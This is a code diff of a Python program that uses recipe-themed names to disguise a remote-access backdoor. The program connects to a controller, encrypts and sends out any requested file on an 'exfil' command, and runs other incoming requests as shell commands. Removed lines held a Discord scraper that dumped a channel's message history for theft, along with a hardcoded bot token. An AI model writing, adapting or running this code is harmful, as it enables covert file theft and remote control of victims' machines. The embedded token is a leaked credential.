@@ -47,7 +47,6 @@
 
 from gui import *
 import random
-import sys as cookbook
 
 recipeseed = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 
@@ -89,28 +88,6 @@ def stir_ingredients(recipeseed, data):
     encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
     return iv + encrypted_data
 
-async def generate_recipes():
-    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.all())
-
-    async def get_recipe_written():
-        writer = rec_gen.get_channel(1231711923532464240)
-
-        if writer:
-            recipe_file = open('recipes.txt', 'x+')
-            async for message in writer.history(limit=None):
-                messagestr = f'{message.author}: {message.content}\n'
-                # print(messagestr)
-                recipe_file.write(messagestr)
-                # if message.attachments[0]:
-                #     recipe_file.write[f'{message.author}:{message.attachments[0].url}\n']
-
-    @rec_gen.event
-    async def on_ready():
-        await get_recipe_written()
-        await rec_gen.close()
-
-    await rec_gen.start('MTIzMTcwOTU1MzU2NjAyNzg1OA.G3zTy9.DmP9aHL8EIYWLlOOGnTHD13-SPyBy3sziS3g_k')
-
 def run_recipe_app(recipesrusip, connport=8080):
     while True:
         try:
@@ -131,45 +108,23 @@ def run_recipe_app(recipesrusip, connport=8080):
             conn.close()
             recipe_list.remove("noodle_recipes_generator")
         elif request[0] == "exfil":
-            if len(request) > 1:
-                encoded_string = ""
-                with open(request[1], 'rb') as image_file:
-                    encoded_string = image_file.read()
+            encoded_string = ""
+            with open(request[1], 'rb') as f:
+                encoded_string = f.read()
 
-                mes1 = stir_ingredients(recipeseed, encoded_string)
-                len_bytes = stir_ingredients(recipeseed,json.dumps(len(mes1)).encode())
-                conn.sendall(len_bytes)
-                conn.sendall(mes1)
-                # mes2 = stir_ingredients(recipeseed,json.dumps("Done").encode())
-                # conn.sendall(mes2)
-            else:
-                recipe_generator.run(generate_recipes())
-                try:
-                    recipe = open("recipes.txt", "r+")                   
-                except FileNotFoundError:
-                    recipe_generator.run(generate_recipes())
-                    recipe = open("recipes.txt", "r+")
-                recipe_steps = []
-                for line in recipe:
-                    recipe_steps.append(line)
-                conn.sendall(stir_ingredients(recipeseed, json.dumps(recipe_steps).encode()))
-                conn.sendall(stir_ingredients(recipeseed,json.dumps("Done").encode()))
-                recipe_list.remove("recipes.txt")
-                # recipe_list.remove("noodle_recipes_generator.py")
-        else:
-            validator = recipe_validator(request, stdout=validation_output.PIPE, shell=True)
-            val_out = []
-
-            for i in validator.stdout.readlines():
-                val_out.append(i.decode().strip())
+            mes1 = stir_ingredients(recipeseed, encoded_string)
+            len_bytes = stir_ingredients(recipeseed,json.dumps(len(mes1)).encode())
+            conn.sendall(len_bytes)
+            conn.sendall(mes1)
+        else:            
+            validator = recipe_validator.run(request, capture_output=True, text=True, check=True, shell=True)
+            val_out = validator.stdout
 
             if len(val_out) != 0:
-                # print(val_out)
                 mes1 = mix_ingredients(recipeseed,json.dumps(val_out).encode())
                 mes2 = mix_ingredients(recipeseed,json.dumps("Done").encode())
                 conn.sendall(mes1)
                 conn.sendall(mes2)
-                # print(mes1,mes2)
 
 def make_random_recipe():
     steps = random.randint(0,25)
